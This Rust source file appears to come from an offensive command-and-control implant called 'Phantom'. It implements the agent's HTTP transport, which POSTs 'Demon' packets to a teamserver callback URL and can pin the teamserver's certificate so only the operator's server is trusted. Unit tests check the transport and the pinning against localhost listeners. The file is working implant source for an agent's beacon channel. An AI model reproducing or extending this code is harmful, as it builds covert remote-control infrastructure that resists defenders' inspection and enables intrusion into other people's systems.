//! HTTP transport for Phantom callback traffic.

use tracing::{debug, warn};

use crate::config::PhantomConfig;
use crate::error::PhantomError;

/// Stateless HTTP transport wrapper.
#[derive(Debug)]
pub struct HttpTransport {
    client: reqwest::Client,
    callback_url: String,
}

impl HttpTransport {
    /// Build a transport from the current agent configuration.
    ///
    /// If `config.pinned_cert_pem` is set, the provided PEM certificate is added as the only
    /// trusted root so the transport only accepts the pinned teamserver certificate.  When no
    /// pinned cert is configured, the system CA store is used instead.
    pub fn new(config: &PhantomConfig) -> Result<Self, PhantomError> {
        let mut builder = reqwest::Client::builder().user_agent(&config.user_agent);

        if let Some(pem) = &config.pinned_cert_pem {
            let cert = reqwest::Certificate::from_pem(pem.as_bytes()).map_err(|error| {
                PhantomError::Transport(format!("invalid pinned certificate: {error}"))
            })?;
            builder = builder.tls_built_in_root_certs(false).add_root_certificate(cert);
        }

        let client = builder.build().map_err(|error| PhantomError::Transport(error.to_string()))?;

        Ok(Self { client, callback_url: config.callback_url.clone() })
    }

    /// POST a raw Demon transport packet and return the response body.
    pub async fn send(&self, packet: &[u8]) -> Result<Vec<u8>, PhantomError> {
        debug!(url = %self.callback_url, packet_len = packet.len(), "sending phantom packet");

        let response = self
            .client
            .post(&self.callback_url)
            .body(packet.to_vec())
            .send()
            .await
            .map_err(|error| PhantomError::Transport(error.to_string()))?;

        let status = response.status();
        if !status.is_success() {
            warn!(%status, "teamserver returned non-success status");
            return Err(PhantomError::Transport(format!("teamserver returned HTTP {status}")));
        }

        let body =
            response.bytes().await.map_err(|error| PhantomError::Transport(error.to_string()))?;
        Ok(body.to_vec())
    }
}

#[cfg(test)]
mod tests {
    use std::error::Error;
    use std::io::{Read, Write};
    use std::net::TcpListener;
    use std::sync::mpsc;
    use std::thread;

    use super::HttpTransport;
    use crate::config::PhantomConfig;

    /// Generate a self-signed PEM certificate for testing.
    fn test_cert_pem() -> String {
        let cert = rcgen::generate_simple_self_signed(["localhost".to_string()])
            .expect("test cert generation");
        cert.cert.pem()
    }

    #[test]
    fn transport_builds_from_default_config() {
        assert!(HttpTransport::new(&PhantomConfig::default()).is_ok());
    }

    #[test]
    fn transport_builds_with_pinned_cert() {
        let config = PhantomConfig { pinned_cert_pem: Some(test_cert_pem()), ..Default::default() };
        assert!(HttpTransport::new(&config).is_ok());
    }

    #[test]
    fn transport_rejects_invalid_pinned_cert_pem() {
        // PEM markers are present but the base64 content is malformed.
        // With the rustls backend, reqwest defers PEM parsing to build() time, so the error
        // surfaces there — we just assert that building fails with a Transport error.
        let config = PhantomConfig {
            pinned_cert_pem: Some(
                "-----BEGIN CERTIFICATE-----\n!!!NOT-VALID-BASE64!!!\n-----END CERTIFICATE-----\n"
                    .to_string(),
            ),
            ..Default::default()
        };
        let err = HttpTransport::new(&config).expect_err("invalid PEM should fail");
        assert!(matches!(&err, crate::error::PhantomError::Transport(_)));
    }

    #[tokio::test]
    async fn send_posts_packet_and_returns_response_body()
    -> Result<(), Box<dyn Error + Send + Sync>> {
        let listener = TcpListener::bind(("127.0.0.1", 0))?;
        let address = listener.local_addr()?;
        let (request_tx, request_rx) = mpsc::channel::<Vec<u8>>();

        let server = thread::spawn(move || -> Result<(), Box<dyn Error + Send + Sync>> {
            let (mut stream, _) = listener.accept()?;
            let request = read_http_request(&mut stream)?;
            request_tx.send(request)?;
            write_http_response(&mut stream, b"phantom-ok")?;
            Ok(())
        });

        let transport = HttpTransport::new(&PhantomConfig {
            callback_url: format!("http://{address}/"),
            ..PhantomConfig::default()
        })?;

        let response = transport.send(b"phantom-packet").await?;
        assert_eq!(response, b"phantom-ok");
        assert_eq!(request_rx.recv_timeout(std::time::Duration::from_secs(1))?, b"phantom-packet");

        let server_result = server.join().map_err(|_| "server thread panicked")?;
        server_result?;
        Ok(())
    }

    fn read_http_request(
        stream: &mut std::net::TcpStream,
    ) -> Result<Vec<u8>, Box<dyn Error + Send + Sync>> {
        let mut request = Vec::new();
        let mut buffer = [0_u8; 4096];
        let mut header_end = None;
        let mut content_length = 0_usize;
        let mut sent_100_continue = false;

        loop {
            let read = stream.read(&mut buffer)?;
            if read == 0 {
                break;
            }
            request.extend_from_slice(&buffer[..read]);

            if header_end.is_none() {
                header_end = request
                    .windows(4)
                    .position(|window| window == b"\r\n\r\n")
                    .map(|index| index + 4);
                if let Some(end) = header_end {
                    let headers = std::str::from_utf8(&request[..end])?;

                    if !sent_100_continue
                        && headers.lines().any(|line| {
                            line.split_once(':')
                                .map(|(name, value)| {
                                    name.eq_ignore_ascii_case("expect")
                                        && value.trim().eq_ignore_ascii_case("100-continue")
                                })
                                .unwrap_or(false)
                        })
                    {
                        stream.write_all(b"HTTP/1.1 100 Continue\r\n\r\n")?;
                        sent_100_continue = true;
                    }

                    content_length = headers
                        .lines()
                        .filter_map(|line| {
                            let (name, value) = line.split_once(':')?;
                            name.eq_ignore_ascii_case("content-length").then_some(value.trim())
                        })
                        .next_back()
                        .unwrap_or("0")
                        .parse::<usize>()?;
                }
            }

            if let Some(end) = header_end
                && request.len() >= end + content_length
            {
                break;
            }
        }

        let Some(end) = header_end else {
            return Ok(Vec::new());
        };
        // Same rationale as `e2e_integration::read_http_body`: return the full suffix after
        // headers. `content_length` only gates when we stop reading from the socket; slicing
        // to it can truncate when the declared length is too small but the buffer is full.
        Ok(request[end..].to_vec())
    }

    fn write_http_response(
        stream: &mut std::net::TcpStream,
        body: &[u8],
    ) -> Result<(), Box<dyn Error + Send + Sync>> {
        stream.write_all(
            format!(
                "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                body.len()
            )
            .as_bytes(),
        )?;
        stream.write_all(body)?;
        Ok(())
    }

    /// Regression test: when a pinned cert is configured, the transport must reject a TLS
    /// server presenting a *different* self-signed certificate — even though both are valid.
    /// Before the fix, `add_root_certificate` augmented the default trust store instead of
    /// replacing it, so a server cert trusted by the system CAs would still be accepted.
    #[tokio::test]
    async fn pinned_cert_rejects_different_server_cert() {
        use std::sync::Arc;
        use tokio::net::TcpListener;

        let _ = rustls::crypto::ring::default_provider().install_default();

        // Generate two independent self-signed certs for localhost.
        let server_keys = rcgen::generate_simple_self_signed(["localhost".to_string()])
            .expect("server cert generation");
        let pinned_keys = rcgen::generate_simple_self_signed(["localhost".to_string()])
            .expect("pinned cert generation");

        // Build a rustls server config using the *server* cert (not the pinned one).
        let server_cert_der =
            rustls::pki_types::CertificateDer::from(server_keys.cert.der().to_vec());
        let server_key_der =
            rustls::pki_types::PrivateKeyDer::try_from(server_keys.key_pair.serialize_der())
                .expect("server key DER");
        let server_tls_config = rustls::ServerConfig::builder()
            .with_no_client_auth()
            .with_single_cert(vec![server_cert_der], server_key_der)
            .expect("server TLS config");
        let acceptor = tokio_rustls::TlsAcceptor::from(Arc::new(server_tls_config));

        // Bind to a random port on localhost.
        let listener = TcpListener::bind("127.0.0.1:0").await.expect("bind");
        let addr = listener.local_addr().expect("local_addr");

        // Spawn a task that accepts one TLS connection and sends a minimal HTTP response.
        let accept_handle = tokio::spawn(async move {
            if let Ok((stream, _)) = listener.accept().await {
                // The TLS handshake may fail from the server side too — that is fine.
                if let Ok(mut tls_stream) = acceptor.accept(stream).await {
                    use tokio::io::AsyncWriteExt;
                    let _ = tls_stream
                        .write_all(b"HTTP/1.1 200 OK\r\ncontent-length: 2\r\n\r\nok")
                        .await;
                    let _ = tls_stream.shutdown().await;
                }
            }
        });

        // Configure transport to pin the *other* cert (not the one the server presents).
        let config = PhantomConfig {
            callback_url: format!("https://localhost:{}", addr.port()),
            pinned_cert_pem: Some(pinned_keys.cert.pem()),
            ..Default::default()
        };
        let transport = HttpTransport::new(&config).expect("transport creation");

        // The send must fail because the server cert doesn't chain to the pinned root.
        let result = transport.send(b"hello").await;
        assert!(result.is_err(), "expected TLS error when server cert != pinned cert");
        let err_msg = format!("{}", result.expect_err("should be error"));
        assert!(
            err_msg.contains("certificate")
                || err_msg.contains("ssl")
                || err_msg.contains("tls")
                || err_msg.contains("error"),
            "error should mention certificate/TLS issue, got: {err_msg}"
        );

        accept_handle.abort();
    }

    /// Verify that when the pinned cert matches the server cert, the connection succeeds.
    #[tokio::test]
    async fn pinned_cert_accepts_matching_server_cert() {
        use std::sync::Arc;
        use tokio::net::TcpListener;

        let _ = rustls::crypto::ring::default_provider().install_default();

        let keys =
            rcgen::generate_simple_self_signed(["localhost".to_string()]).expect("cert generation");

        let cert_pem = keys.cert.pem();
        let cert_der = rustls::pki_types::CertificateDer::from(keys.cert.der().to_vec());
        let key_der = rustls::pki_types::PrivateKeyDer::try_from(keys.key_pair.serialize_der())
            .expect("key DER");
        let server_tls_config = rustls::ServerConfig::builder()
            .with_no_client_auth()
            .with_single_cert(vec![cert_der], key_der)
            .expect("server TLS config");
        let acceptor = tokio_rustls::TlsAcceptor::from(Arc::new(server_tls_config));

        let listener = TcpListener::bind("127.0.0.1:0").await.expect("bind");
        let addr = listener.local_addr().expect("local_addr");

        let accept_handle = tokio::spawn(async move {
            if let Ok((stream, _)) = listener.accept().await {
                if let Ok(mut tls_stream) = acceptor.accept(stream).await {
                    use tokio::io::AsyncWriteExt;
                    let _ = tls_stream
                        .write_all(b"HTTP/1.1 200 OK\r\ncontent-length: 2\r\n\r\nok")
                        .await;
                    let _ = tls_stream.shutdown().await;
                }
            }
        });

        let config = PhantomConfig {
            callback_url: format!("https://localhost:{}", addr.port()),
            pinned_cert_pem: Some(cert_pem),
            ..Default::default()
        };
        let transport = HttpTransport::new(&config).expect("transport creation");

        let result = transport.send(b"hello").await;
        assert!(
            result.is_ok(),
            "pinned cert matches server cert — should succeed, got: {result:?}"
        );

        accept_handle.abort();
    }
}
